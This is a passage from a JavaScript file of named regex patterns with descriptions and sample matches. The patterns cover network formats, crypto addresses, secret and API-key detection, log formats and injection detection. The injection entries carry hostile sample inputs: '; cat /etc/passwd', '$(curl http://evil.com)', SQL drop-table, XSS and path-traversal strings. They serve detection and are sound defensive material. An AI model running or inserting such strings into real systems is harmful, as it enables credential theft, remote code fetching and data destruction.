    desc: "Match MAC addresses in colon-separated or dash-separated format.",
    matches: ["00:1A:2B:3C:4D:5E", "aa:bb:cc:dd:ee:ff", "00-1A-2B-3C-4D-5E"]
  },
  {
    name: "Port Number",
    pattern: "\\b(?:[1-9]\\d{0,3}|[1-5]\\d{4}|6[0-4]\\d{3}|65[0-4]\\d{2}|655[0-2]\\d|6553[0-5])\\b",
    desc: "Match valid TCP/UDP port numbers (1-65535).",
    matches: ["80", "443", "8080", "3306", "65535"]
  },
  {
    name: "Domain Name",
    pattern: "\\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,}\\b",
    desc: "Match fully qualified domain names.",
    matches: ["example.com", "sub.domain.co.uk", "my-site.org", "api.internal.company.io"]
  },
  {
    name: "Subdomain Pattern",
    pattern: "\\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?\\.){2,}[a-zA-Z]{2,}\\b",
    desc: "Match domain names with at least one subdomain level.",
    matches: ["www.example.com", "api.v2.service.io", "mail.server.domain.co.uk"]
  },

  // ============================================================
  // SECURITY
  // ============================================================
  {
    name: "Base64 Encoded String",
    pattern: "(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?",
    desc: "Match Base64-encoded strings (minimum 8 characters with proper padding).",
    matches: ["SGVsbG8gV29ybGQ=", "dGVzdCBzdHJpbmc=", "YWJjZGVmZw=="]
  },
  {
    name: "Hex String",
    pattern: "\\b(?:0x)?[0-9a-fA-F]{8,}\\b",
    desc: "Match hexadecimal strings of 8 or more characters, optionally prefixed with 0x.",
    matches: ["0xdeadbeef", "4141414141414141", "0x0804a010", "cafebabe"]
  },
  {
    name: "Bitcoin Address",
    pattern: "\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b",
    desc: "Match Bitcoin addresses (Base58Check encoding starting with 1 or 3).",
    matches: ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"]
  },
  {
    name: "PGP Public Key Block",
    pattern: "-----BEGIN PGP PUBLIC KEY BLOCK-----[\\s\\S]*?-----END PGP PUBLIC KEY BLOCK-----",
    desc: "Match PGP/GPG public key blocks in ASCII armor format.",
    matches: ["-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v1\n\nmQENBF...\n-----END PGP PUBLIC KEY BLOCK-----"]
  },
  {
    name: "Ethereum Address",
    pattern: "\\b0x[0-9a-fA-F]{40}\\b",
    desc: "Match Ethereum wallet addresses (0x followed by 40 hex characters).",
    matches: ["0x32Be343B94f860124dC4fEe278FDCBD38C102D88", "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe"]
  },

  // ============================================================
  // CODE INJECTION
  // ============================================================
  {
    name: "SQL Injection Patterns",
    pattern: "(?:'\\s*(?:OR|AND)\\s+['\"]?\\d+['\"]?\\s*=\\s*['\"]?\\d+|(?:UNION\\s+(?:ALL\\s+)?SELECT)|(?:INSERT|UPDATE|DELETE)\\s+(?:INTO|FROM|SET)|'\\s*;\\s*(?:DROP|ALTER|CREATE)\\s+TABLE|--\\s*$|/\\*.*?\\*/)",
    desc: "Detect common SQL injection attack patterns in user input.",
    matches: ["' OR '1'='1", "UNION SELECT NULL,NULL", "'; DROP TABLE users--", "1' AND 1=1--"]
  },
  {
    name: "XSS Patterns",
    pattern: "(?:<script[^>]*>|javascript\\s*:|on(?:load|error|click|mouseover|focus|blur)\\s*=|<img[^>]+onerror|<svg[^>]+onload|<iframe[^>]*src)",
    desc: "Detect common Cross-Site Scripting (XSS) attack vectors.",
    matches: ["<script>alert(1)</script>", "javascript:alert(1)", "onerror=alert(1)", "<img src=x onerror=alert(1)>"]
  },
  {
    name: "Command Injection",
    pattern: "(?:[;&|]\\s*(?:cat|ls|id|whoami|wget|curl|nc|bash|sh|python|perl|ruby|php)\\b|`[^`]+`|\\$\\([^)]+\\))",
    desc: "Detect OS command injection patterns in user input.",
    matches: ["; cat /etc/passwd", "| whoami", "`id`", "$(curl http://evil.com)"]
  },
  {
    name: "Path Traversal",
    pattern: "(?:\\.\\./|\\.\\.\\\\|%2e%2e%2f|%2e%2e%5c|%252e%252e%252f){2,}",
    desc: "Detect directory traversal attack patterns with various encodings.",
    matches: ["../../../etc/passwd", "..\\..\\..\\windows\\system32", "%2e%2e%2f%2e%2e%2f%2e%2e%2f"]
  },

  // ============================================================
  // SECRETS
  // ============================================================
  {
    name: "Private Key Header (RSA/EC/DSA)",
    pattern: "-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
    desc: "Detect private key file headers (PEM format) indicating exposed cryptographic keys.",
    matches: ["-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----", "-----BEGIN EC PRIVATE KEY-----"]
  },
  {
    name: "Database Connection String",
    pattern: "(?:mongodb(?:\\+srv)?|mysql|postgres(?:ql)?|mssql|redis|amqp)://[^\\s'\"]+",
    desc: "Match database connection strings with protocol, credentials, and host.",
    matches: ["mongodb://admin:password@localhost:27017/db", "postgres://user:pass@host:5432/database", "redis://default:secret@cache.host:6379"]
  },
  {
    name: "Bearer Token",
    pattern: "(?:Bearer|bearer)\\s+[A-Za-z0-9_\\-.~+/]+=*",
    desc: "Match Bearer authentication tokens in HTTP headers.",
    matches: ["Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "bearer abc123def456ghi789"]
  },
  {
    name: "Basic Auth Header",
    pattern: "(?:Basic|basic)\\s+[A-Za-z0-9+/]+=*",
    desc: "Match HTTP Basic Authentication headers (base64-encoded credentials).",
    matches: ["Basic dXNlcjpwYXNzd29yZA==", "basic YWRtaW46YWRtaW4="]
  },
  {
    name: "Password in URL",
    pattern: "(?:https?|ftp|ssh|mysql|postgres)://[^:]+:([^@\\s]+)@",
    desc: "Detect credentials embedded in URLs (password between : and @).",
    matches: ["https://admin:secretpass@example.com", "ftp://user:p@ssw0rd@ftp.server.com", "mysql://root:toor@localhost:3306"]
  },
  {
    name: "Generic Secret Assignment",
    pattern: "(?i)(?:secret|password|passwd|pwd|token|api_key|apikey|access_key|auth)\\s*[:=]\\s*['\"]([^'\"\\s]{8,})['\"]",
    desc: "Match secret or password assignments in source code and configuration files.",
    matches: ["secret = 'my_super_secret_value'", "password: \"hunter2isnotgood\"", "TOKEN=\"abcdefgh12345678\""]
  },

  // ============================================================
  // LOG PATTERNS
  // ============================================================
  {
    name: "Syslog Format",
    pattern: "^(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}\\s+\\S+\\s+\\S+(?:\\[\\d+\\])?:",
    desc: "Match standard syslog message format (timestamp, hostname, process).",
    matches: ["Jan  1 12:00:00 server sshd[1234]:", "Dec 31 23:59:59 hostname kernel:", "Mar 15 08:30:00 web01 nginx[5678]:"]
  },
  {
    name: "Apache/Nginx Combined Log",
    pattern: "^\\S+\\s+-\\s+\\S+\\s+\\[\\d{2}/\\w{3}/\\d{4}:\\d{2}:\\d{2}:\\d{2}\\s+[+-]\\d{4}\\]\\s+\"\\w+\\s+\\S+\\s+HTTP/[\\d.]+\"\\s+\\d{3}\\s+\\d+",
    desc: "Match Apache/Nginx combined log format entries.",
    matches: ["192.168.1.1 - admin [01/Jan/2024:12:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 1234"]
  },
  {
    name: "Windows Event ID",
    pattern: "(?:Event\\s*ID|EventID)\\s*[:=]?\\s*(\\d{1,5})",
    desc: "Match Windows Event Log event IDs.",
    matches: ["Event ID: 4624", "EventID=4625", "Event ID 1102"]
  },

  // ============================================================
  // ADDITIONAL PATTERNS
  // ============================================================
  {
    name: "Phone Number (US)",
    pattern: "\\b(?:\\+?1[\\s.-]?)?\\(?\\d{3}\\)?[\\s.-]?\\d{3}[\\s.-]?\\d{4}\\b",
    desc: "Match US phone numbers in various formats.",
    matches: ["+1 (555) 123-4567", "555-123-4567", "5551234567", "1.555.123.4567"]
  },
  {
    name: "Date (ISO 8601)",
    pattern: "\\b\\d{4}-(?:0[1-9]|1[0-2])-(?:0[1-9]|[12]\\d|3[01])(?:T(?:[01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d(?:\\.\\d+)?(?:Z|[+-]\\d{2}:?\\d{2})?)?\\b",
    desc: "Match dates in ISO 8601 format with optional time component.",
    matches: ["2024-01-15", "2024-12-31T23:59:59Z", "2024-06-15T12:00:00+05:30"]
  },
  {
    name: "UUID (Version 4)",
    pattern: "\\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-4[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}\\b",
    desc: "Match UUID v4 strings (with version 4 indicator and variant bits).",
    matches: ["550e8400-e29b-41d4-a716-446655440000", "f47ac10b-58cc-4372-a567-0e02b2c3d479"]
  },
  {
    name: "Semantic Version",
    pattern: "\\bv?(?:0|[1-9]\\d*)\\.(?:0|[1-9]\\d*)\\.(?:0|[1-9]\\d*)(?:-[\\da-zA-Z-]+(?:\\.[\\da-zA-Z-]+)*)?(?:\\+[\\da-zA-Z-]+(?:\\.[\\da-zA-Z-]+)*)?\\b",
    desc: "Match semantic version strings (major.minor.patch with optional pre-release and build metadata).",
    matches: ["v1.0.0", "2.3.1-beta.1", "0.1.0+build.123", "10.20.30"]
  },
  {
    name: "IBAN (International Bank Account Number)",
    pattern: "\\b[A-Z]{2}\\d{2}\\s?[A-Z0-9]{4}\\s?(?:[A-Z0-9]{4}\\s?){1,7}[A-Z0-9]{1,4}\\b",
    desc: "Match International Bank Account Numbers.",
    matches: ["GB29 NWBK 6016 1331 9268 19", "DE89370400440532013000", "FR7630006000011234567890189"]
  },
  {
    name: "Docker Image Reference",
    pattern: "(?:[a-z0-9]+(?:[._-][a-z0-9]+)*/)?[a-z0-9]+(?:[._-][a-z0-9]+)*(?::[\\w][\\w.-]{0,127})?(?:@sha256:[a-fA-F0-9]{64})?",
    desc: "Match Docker image references with optional registry, tag, and digest.",
    matches: ["nginx:latest", "registry.example.com/myapp:v1.2.3", "ubuntu@sha256:abcdef1234567890"]
  },
  {
    name: "CVE Identifier",
    pattern: "CVE-\\d{4}-\\d{4,}",
    desc: "Match Common Vulnerabilities and Exposures identifiers.",
    matches: ["CVE-2024-12345", "CVE-2021-44228", "CVE-2023-0001"]
  },
  {
    name: "Stripe API Key",
    pattern: "(?:sk|pk)_(?:test|live)_[0-9a-zA-Z]{24,}",
    desc: "Match Stripe secret and publishable API keys.",
    matches: ["<STRIPE_TEST_KEY>", "<STRIPE_PUB_KEY>"]
  },
  {
    name: "SendGrid API Key",
    pattern: "SG\\.[a-zA-Z0-9_-]{22}\\.[a-zA-Z0-9_-]{43}",
    desc: "Match SendGrid API keys.",
    matches: ["SG.EXAMPLE_REDACTED.EXAMPLE"]
  },
  {
    name: "Twilio API Key",
    pattern: "SK[0-9a-fA-F]{32}",
    desc: "Match Twilio API Key SIDs.",
    matches: ["SK_EXAMPLE_REDACTED"]
  },
  {
    name: "Heroku API Key",
    pattern: "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}",
    desc: "Match Heroku API keys (UUID format).",
    matches: ["01234567-89ab-cdef-0123-456789abcdef"]
  },
  {
    name: "SSH Private Key File Path",
    pattern: "(?:/[\\w.-]+)*/\\.ssh/(?:id_rsa|id_dsa|id_ecdsa|id_ed25519)(?:\\.pub)?",
    desc: "Match paths to SSH key files.",
    matches: ["/home/user/.ssh/id_rsa", "/root/.ssh/id_ed25519", "/home/admin/.ssh/id_ecdsa.pub"]
  },
  {
    name: "Kubernetes Secret Reference",
    pattern: "(?:kind:\\s*Secret|secretKeyRef|secretName)\\s*[:=]?\\s*[\\w.-]+",
    desc: "Match references to Kubernetes secrets in YAML/JSON manifests.",
    matches: ["kind: Secret", "secretKeyRef: my-secret", "secretName: db-credentials"]
  },
  {
    name: "LDAP Injection",
    pattern: "[()\\\\*|&](?:(?:\\\\[0-9a-fA-F]{2})+|[\\x00-\\x1f])",
    desc: "Detect potential LDAP injection characters and escape sequences.",
    matches: ["(\\00)", "*(|(cn=admin))", "\\2a\\28"]
  },
];

export { WINDOWS_COMMANDS, BASH_ONELINERS, POWERSHELL_ONELINERS, PYTHON_SNIPPETS, REGEX_PATTERNS };
